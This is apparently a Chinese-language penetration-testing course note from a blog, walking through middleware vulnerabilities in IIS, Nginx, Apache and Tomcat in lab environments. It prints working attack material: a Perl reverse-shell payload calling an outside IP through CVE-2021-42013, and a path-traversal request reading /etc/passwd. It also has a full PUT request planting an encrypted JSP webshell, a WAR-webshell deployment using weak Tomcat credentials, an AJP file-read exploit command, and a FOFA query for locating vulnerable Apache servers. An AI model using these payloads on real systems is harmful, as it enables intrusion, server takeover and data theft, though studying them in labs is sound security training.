![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134454642-1486353793.png)

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134506720-1065869465.png)

```plain
#知识点：
中间件及框架列表：
IIS，Apache，Nginx，Tomcat，Docker，Weblogic，JBoos，WebSphere，Jenkins ，GlassFish，Jira，Struts2，Laravel，Solr，Shiro，Thinkphp，Spring，Flask，jQuery等
1、中间件-IIS-短文件&解析&蓝屏等
2、中间件-Nginx-文件解析&命令执行等
3、中间件-Apache-RCE&目录遍历&文件解析等
4、中间件-Tomcat-弱口令&文件上传&文件包含等

#章节内容：
常见中间件的安全测试：
1、配置不当-解析&弱口令
2、安全机制-特定安全漏洞
3、安全机制-弱口令爆破攻击
4、安全应用-框架特定安全漏洞

#前置知识：
中间件安全测试流程：
1、判断中间件信息-名称&版本&三方
2、判断中间件问题-配置不当&公开漏洞
3、判断中间件利用-弱口令&EXP&框架漏洞

应用服务安全测试流程：见图
1、判断服务开放情况-端口扫描&组合应用等
2、判断服务类型归属-数据库&文件传输&通讯等
3、判断服务利用方式-特定漏洞&未授权&弱口令等
```

- 中间件-IIS-短文件&解析&蓝屏等

```plain
1、短文件：信息收集
2、文件解析：还有点用
参考前面课程

3、HTTP.SYS：蓝屏崩溃（2013年）破坏性漏洞
https://blog.csdn.net/qq_44159028/article/details/112508950

4、CVE-2017-7269 条件过老（需要条件过多）
https://blog.csdn.net/Fly_hps/article/details/79568430

IIS比较少了，比较老牌的源码，像asp，asp.net这类源码
```

- 中间件-Nginx-文件解析&命令执行等

```plain
1、后缀解析 文件名解析
配置不当：该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。
只需要在图片后面加上./php就能执行出php效果。


参考：https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerability/

启动环境：
cd /vulhub-master/nginx/nginx_parsing_vulnerability
sudo docker-compose up -d

判断存在：
访问：http://192.168.233.128/uploadfiles/nginx.png
这是一个正常的图片，但是在后面加上/.php就会出现问题。
访问：http://192.168.233.128/uploadfiles/nginx.png/.php
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134521951-1303249482.png)

```plain
在上传图片中，如果上传一个jpg文件，抓包，正常的情况下访问是一张图片：
访问：/var/www/html/uploadfiles/1b82db4f6c22c9ba690e4e3c4bbbd75e.png
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134521569-831161943.png)

```plain
访问一下：http://192.168.233.128/uploadfiles/1b82db4f6c22c9ba690e4e3c4bbbd75e.png/.php
执行出了php效果。
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134522422-1936255079.png)

```plain
如果php图片中带有后门，那样就能进行getshell操作了。
2.CVE-2013-4547：影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7
像中间件这种漏洞的话，只要符合版本，一般几率都比较高。因为还可以用，不像软件一样需要更新才能继续使用。

参考：https://vulhub.org/#/environments/nginx/CVE-2013-4547/

启动环境：
cd /vulhub-master/nginx/CVE-2013-4547
sudo docker-compose up -d

访问：http://192.168.233.128:8080

上传文件，抓取数据包，在filename="1.jpg"中加上空格，变成：filename="1.jpg "
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134521891-2120606143.png)

```plain
然后访问这个图片：http://192.168.233.128:8080/uploadfiles/

抓取数据包，url头进行修改：/uploadfiles/1.jpg  .php
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134521706-1088184923.png)

```plain
然后在hex中进行编码，修改为%20，%00
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134523597-2069721286.png)

```plain
数据包重新发送，执行出phpinfo效果
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134522805-744369503.png)

```plain
3、cve_2021_23017 无EXP
没有漏洞复现，只有相关的修复方案

4、cve_2017_7529 意义不大（信息泄露）
https://blog.csdn.net/qq_45688822/article/details/115458202
```

- 中间件-Apache-RCE&目录遍历&文件解析等

```plain
Apache HTTP Server是美国阿帕奇（Apache）基金会的一款开源网页服务器。该服务器具有快速、可靠且可通过简单的API进行扩充的特点，发现 Apache HTTP Server 2.4.50 中针对 CVE-2021-41773 的修复不够充分。攻击者可以使用路径遍历攻击将 URL 映射到由类似别名的指令配置的目录之外的文件。如果这些目录之外的文件不受通常的默认配置“要求全部拒绝”的保护，则这些请求可能会成功。如果还为这些别名路径启用了 CGI 脚本，则这可能允许远程代码执行。此问题仅影响 Apache 2.4.49 和 Apache 2.4.50，而不影响更早版本。

1、cve_2021_42013  RCE
环境：http://vulfocus.io/

访问网站，抓取数据包，返回包符合漏洞版本：Server: Apache/2.4.50 (Unix)
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134522476-895000299.png)

```plain
利用：
请求地址：/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh 
POST提交：echo;perl -e 'use Socket;$i="175.178.151.29";$p=5566;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

这个反弹shell的命令是Perl语言，也可以来源其他的语言，还可以使用其他语法来反弹shell，需要有perl环境才能执行。参考：https://forum.ywhack.com/shell.php

然后服务器监听5566（这个网上环境不知道怎么没了，所以演示不了）
2、cve_2021_41773 目录穿越（可以看到文件列表）
环境：http://vulfocus.io/#/dashboard

Apache HTTP Server 2.4.49、2.4.50版本对路径规范化所做的更改中存在一个路径穿越漏洞，攻击者可利用该漏洞读取到Web目录外的其他文件，如系统配置文件、网站源码等，甚至在特定情况下，攻击者可构造恶意请求执行命令，控制服务器。

访问，抓取数据包，返回版本：Server: Apache/2.4.49 (Debian)
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134523366-1289707849.png)

```plain
然后用burpsuite访问：/icons/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd
读取到内容，一定要用burpsuite访问，在URL访问会出现编码。
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134524901-1622707699.png)

```plain
3、cve-2017-15715  文件解析
Apache HTTPD是一款HTTP服务器。其2.4.0~2.4.29版本存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。
需要配合文件上传，并且这个文件上传必须符合黑名单验证才可以。


环境：
cd /vulhub-master/httpd$ CVE-2017-15715/
sudo docker-compose up -d
参考：https://vulhub.org/#/environments/httpd/CVE-2017-15715/

访问：http://192.168.233.128:8080/
抓包，查看版本：Server: Apache/2.4.10 (Debian)

符合这个漏洞的版本，抓包，把
Content-Disposition: form-data; name="name"

1.php 
在1.php中后面加上空格，然后在hex中把20修改为0a
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134524517-1259417936.png)

```plain
然后发送数据包
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134524240-141619983.png)

```plain
然后访问：http://192.168.233.128:8080/1.php这个是不存在的文件名

然后抓取数据包，加上%0a去访问，就会执行出phpinfo效果。
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134524632-486470014.png)

```plain
4、cve_2017_9798 价值不高，信息泄露漏洞
https://www.csdn.net/tags/OtDaUgzsODQzNDgtYmxvZwO0O0OO0O0O.html

5、cve_2018_11759 价值不高，访问控制绕过漏洞，不和权限挂钩
https://blog.csdn.net/nullname0396/article/details/105729077

6、cve_2021_37580 插件问题，没有引用就没有漏洞
https://blog.csdn.net/weixin_45641737/article/details/121871978
```

- 中间件-Tomcat-弱口令&文件上传&文件包含等

```plain
1、弱口令猜解
配置不当导致后台弱口令，可通过上传jsp压缩包改名的war拿shell，在其他中间件没有登录，但是这个有登录，可以拿shell，内置有文件上传。

环境：http://vulfocus.io/#/dashboard

访问网站后，出现Tomcat原始界面，点击manager app，就会出现管理界面
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134523703-574194956.png)

```plain
使用弱口令tomcat，tomcat进行登录

在WAR file to deploy中有一个上传地址。这里只需要上传一个jsp后门就可以进行解析，但是默认不加载jsp后缀，我们需要制作一个war包来进行解析。

制作war包：
找一个jsp后门，然后把他压缩成zip，把zip的格式改为war就可以完成
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134524292-1685260712.png)

```plain
然后上传shell.war文件
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134523400-1813437068.png)

```plain
上传完成后，默认跳转地址下面有一个/shell，
然后连接：http://123.58.236.76:49141/shell/shell.jsp
这样就连接成功了。
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134523999-1936248289.png)

```plain
2、CVE-2017-12615 文件上传
当存在漏洞的Tomcat运行在Windows/Linux主机上， 且启用了HTTP PUT请求方法（ 例如， 将readonly初始化参数由默认值设置为false） ， 攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的JSP的webshell文件，JSP文件中的恶意代码将能被服务器执行， 导致服务器上的数据泄露或获取服务器权限。
影响版本:Apache Tomcat 7.0.0 - 7.0.79

环境：http://vulfocus.io/#/dashboard

抓取数据包，然后把POST请求改为PUT请求，在访问1.jsp，然后在POST提交中提交webshell后门。这个后门是上次生成的后门代码。
数据包：
PUT /1.jsp/ HTTP/1.1
Host: 123.58.236.76:27965
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 592

<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134524191-524439423.png)

```plain
然后用进行连接，连接地址：http://123.58.236.76:27965/1.jsp/
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134524107-1991745711.png)

```plain
3、cve_2020_1938 文件包含
Apache Tomcat AJP协议（默认8009端口）由于存在实现缺陷导致相关参数可控，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp目录下的任意文件。若服务器端同时存在文件上传功能，攻击者可进一步结合文件包含实现远程代码的执行。
漏洞影响的产品版本包括：
Tomcat 6.*
Tomcat 7.* < 7.0.100
Tomcat 8.* < 8.5.51
Tomcat 9.* < 9.0.31

环境：http://vulfocus.io/#/dashboard

直接利用工具：https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
这个脚本是用python2来进行编写的。

执行：G:\python2\python.exe CNVD-2020-10487-Tomcat-Ajp-lfi.py 123.58.236.76 -p 29641 -f WEB-INF/web.xml
就可以直接读取这个文件。
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134524180-81272649.png)

```plain
4、cve_2020_11996 拒绝服务，危害过大，权限无关，意义不大

5、cve_2020_9484 反序列化，利用条件太苛刻，意义不大
条件：
1.攻击者能够控制服务器上文件的内容和文件名称；
2.服务器PersistenceManager配置中使用了FileStore；
3.PersistenceManager中的sessionAttributeValueClassNameFilter被配置为“null”，或者过滤器不够严格，导致允许攻击者提供反序列化数据的对象；
4.攻击者知道使用的FileStore存储位置到攻击者可控文件的相对路径
参考：https://blog.csdn.net/rafanra/article/details/115341624	
```

- 中间件-Apache_RCE&Fofa_Viewer-走向高端啊

```plain
server="Apache/2.4.49"

用到工具CVE-2021-41773_CVE-2021-42013-main，双击运行就可以了。有手就行，可惜我没手。
在后期，也可以用脚本进行跑，来获取相关的信息

比如：
www.xxx.com  tomcat ->检测脚本（弱口令，cve）
www.sss.com  apache ->检测脚本（文件上传等）
```